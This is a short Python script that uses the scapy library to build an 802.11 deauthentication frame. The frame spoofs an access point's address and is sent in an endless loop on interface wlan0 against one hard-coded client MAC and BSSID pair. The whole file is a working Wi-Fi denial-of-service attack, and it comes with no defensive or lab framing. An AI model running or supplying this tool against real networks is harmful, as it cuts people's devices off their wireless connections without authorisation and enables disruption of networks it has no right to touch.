#!/usr/bin/env python
#coding:utf-8

from scapy.all import *

def wifi_down(client_mac, bssid):
    pkt = RadioTap() / Dot11(subtype=0x00c, addr1=client_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=0)
    while(True):
        sendp(pkt, iface='wlan0')
    
if __name__ == '__main__':
    wifi_down('ec:1d:7f:bc:b3:a8', 'E4:D3:32:4B:03:9C')